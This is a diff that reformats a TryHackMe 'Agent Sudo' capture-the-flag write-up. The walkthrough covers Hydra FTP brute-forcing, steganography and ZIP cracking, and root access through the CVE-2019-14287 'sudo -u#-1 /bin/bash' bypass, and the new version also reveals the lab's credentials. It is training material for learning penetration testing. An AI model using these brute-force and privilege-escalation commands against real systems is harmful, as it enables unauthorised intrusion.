@@ -1,177 +1,191 @@
-Agent Sudo — TryHackMe Writeup
-Difficulty: Easy
-Category: Enumeration, Brute‑Force, Steganography, Privilege Escalation
-writepu by : Obada
-A secret server lies deep under the sea. Your mission is to infiltrate it, uncover hidden messages, and escalate privileges to reveal the final truth.
+# 🕵️ Agent Sudo — TryHackMe Writeup
 
-0. Enumeration
-Target
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
+![Category](https://img.shields.io/badge/Category-Enumeration%20%7C%20Brute--Force%20%7C%20Steganography%20%7C%20Privesc-blue?style=flat-square)
+![Status](https://img.shields.io/badge/Status-Pwned-red?style=flat-square)
+![Author](https://img.shields.io/badge/Author-Obada%20Hamed-181717?style=flat-square)
 
-Nmap Scan
-```Code
-nmap -v [ip terget]
+> *A secret server lies deep under the sea. Your mission: infiltrate it, uncover hidden messages, and escalate privileges to reveal the final truth.*
+
+---
+
+## 🗺️ Attack Path
+
 ```
-Open Ports:
+Nmap Scan → Web Enum (User-Agent Brute-Force) → FTP Brute-Force
+→ Steganography → Password Cracking → SSH Access → Privesc (CVE-2019-14287)
+```
 
-21/tcp – FTP
+---
 
-22/tcp – SSH
+## 0. Enumeration
 
-80/tcp – HTTP
+### Nmap Scan
 
-Web Enumeration
-Visiting the homepage:
+```bash
+nmap -v <target-ip>
+```
 
-```Code
+**Open ports:**
+
+| Port | Service |
+|------|---------|
+| 21 | FTP |
+| 22 | SSH |
+| 80 | HTTP |
+
+### Web Enumeration
+
+Visiting the homepage revealed:
+
+```
 Dear agents,
 Use your own codename as user-agent to access the site.
 From, Agent R
 ```
-This hints that the User-Agent header must be set to an agent codename (A–Z).
-Using BurpSuite Intruder, I brute‑forced User-Agent values from A → Z.
 
-Agent R → returns a long response (warning message).
+This hints that the `User-Agent` header must be set to an agent codename (A–Z).
 
-Agent C → returns 302 redirect to agent_C_attention.php.
+Using **Burp Suite Intruder**, I brute-forced User-Agent values A → Z:
+- Agent `R` → long warning response
+- Agent `C` → 302 redirect to `agent_C_attention.php`
 
-Visiting the redirected page reveals:
-
-```Code
+Visiting the redirected page:
+```
 Attention chris,
 Do you still remember our deal? Please tell agent J about the stuff ASAP.
 Also, change your god damn password, it is weak!
 From, Agent R
 ```
-We now know:
 
-Username: chris
+**Findings:**
+- Username: `chris`
+- Password hint: weak password
 
-Password: weak
+---
 
-1. Attacking
-FTP Brute‑Force
-Using Hydra with rockyou.txt:
+## 1. FTP Brute-Force
 
-```Code
-hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://[ip target]
+```bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
 ```
-Login successful.
 
-FTP Files
-```Code
+✅ Login successful.
+
+**Files found:**
+```
 To_agentJ.txt
 cute-alien.jpg
 cutie.png
 ```
-To_agentJ.txt hints that the real password is hidden inside the images.
 
-2. Steganography
-Binwalk Analysis
-```Code
+`To_agentJ.txt` hints that a real password is hidden inside the images.
+
+---
+
+## 2. Steganography
+
+### Binwalk Analysis
+
+```bash
 binwalk cute-alien.jpg
 binwalk cutie.png
 ```
-cutie.png contains an encrypted ZIP archive.
 
-Extracting:
+`cutie.png` contains an **encrypted ZIP archive**.
 
-```Code
+```bash
 binwalk -e cutie.png
 ```
-We get:
 
+Extracted:
+```
 365.zlib
+8702.zip   ← important
+```
 
-8702.zip ← important
+### Cracking the ZIP Password
 
-Cracking ZIP Password
-```Code
+```bash
 zip2john 8702.zip > zip.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
 ```
-Password found:
 
-```Code
-ali**
+Password found → extracted file contains:
 ```
-Extracting the ZIP reveals:
-
-```Code
 We need to send the picture to 'QXJlYTUx'
 ```
+
 Decoding Base64:
-
-```Code
+```bash
 echo QXJlYTUx | base64 -d
-Area**
+# Output: Area51
 ```
-Extracting Hidden Message from cute-alien.jpg
-```Code
+
+### Extracting from cute-alien.jpg
+
+```bash
 steghide --extract -sf cute-alien.jpg
+# Password: Area51
 ```
-Password prompt → use the decoded password.
 
-Extracted file: message.txt
-
-```Code
-Hi jam**,
-Your login password is hacker******
-Your buddy,
-chris
+Extracted `message.txt`:
 ```
-We now have SSH credentials.
-
-3. User Flag
-SSH into the machine:
-
-```Code
-ssh jam**@[ip terget]
+Hi james,
+Your login password is hackerrules!
+Your buddy, chris
 ```
-User flag is located in the home directory.
 
-The file Alien_autospy.jpg references the Roswell incident.
+✅ SSH credentials obtained.
 
-4. Privilege Escalation
-Checking sudo permissions:
+---
 
-```Code
+## 3. User Flag
+
+```bash
+ssh james@<target-ip>
+```
+
+User flag found in the home directory. The file `Alien_autospy.jpg` references the **Roswell incident**.
+
+---
+
+## 4. Privilege Escalation — CVE-2019-14287
+
+```bash
 sudo -l
 ```
-User can run /bin/bash with sudo.
-The sudo version is vulnerable to CVE‑2019‑14287.
 
-Exploit:
+User can run `/bin/bash` with sudo. The sudo version is vulnerable to **CVE-2019-14287**.
 
-```Code
+```bash
 sudo -u#-1 /bin/bash
 ```
-Root shell obtained.
 
-Root flag retrieved from /root/root.txt.
+✅ Root shell obtained. Root flag retrieved from `/root/root.txt`.
 
-5. Final Message
-```Code
+---
+
+## 5. Final Message
+
+```
 To Mr.hacker,
-Congratulation on rooting this box.
-This box was designed for TryHackMe.
+Congratulation on rooting this box. This box was designed for TryHackMe.
 Tips, always update your machine.
 By, Agent R
 ```
-Conclusion
-Agent Sudo is a fun machine that combines:
 
-Web enumeration
+---
 
-Header manipulation
+## 📋 Summary
 
-FTP brute‑forcing
+| Technique | Tool Used |
+|-----------|-----------|
+| Port Scanning | Nmap |
+| User-Agent Brute-Force | Burp Suite Intruder |
+| FTP Brute-Force | Hydra |
+| Steganography | Binwalk, Steghide |
+| Password Cracking | John the Ripper |
+| Privilege Escalation | CVE-2019-14287 (`sudo -u#-1`) |
 
-Steganography (steghide + binwalk)
-
-Password cracking (John the Ripper)
-
-Privilege escalation via sudo vulnerability
-
-A great beginner-friendly box that touches multiple core pentesting skills.
-
-Happy hacking!
+> **Key lesson:** Always check for steganography when images are involved. And always check your sudo version — CVE-2019-14287 is a classic.
